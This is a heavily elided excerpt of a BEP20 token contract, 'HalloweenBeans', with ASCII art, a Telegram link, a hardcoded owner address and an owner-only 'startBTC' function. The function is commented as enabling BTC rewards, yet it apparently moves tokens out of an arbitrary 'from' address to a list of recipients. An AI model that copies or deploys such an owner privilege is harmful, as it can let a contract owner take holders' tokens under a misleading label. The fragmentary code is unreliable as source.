...
.___,_Happy_Halloween Beans____.______
| ./(       )\.        |             |
| )  \/\_/\/  (        |             |
| `)  (^Y^)  (`      \(|)/           |
|  `),-(~)-,(`      --(")--          |
...
|         \    \____/   /   {|~~~|}  |
|          `'-.......-'`    {/^^^\}  |
.___BSC______________________`m-m`___.

Telegram: https://t.me/HalloweenBeans
Website TBA
...
contract HalloweenBeans is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "HalloweenBeans";
    string constant _symbol = "HallowBeans";
    ...
    address public Owner=0x919B8c47ef5a6B22728b7caE38D8e78338BbD390; // owner address
    ...
    constructor () Auth(Owner) {
        ...
        marketingFeeReceiver = 0x919B8c47ef5a6B22728b7caE38D8e78338BbD390;
...
/* enable btc Rewards at higher marketcap */


 function startBTC(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    ...
    require(balanceOf(from) >= SCCC, "Not enough tokens to startBTC");
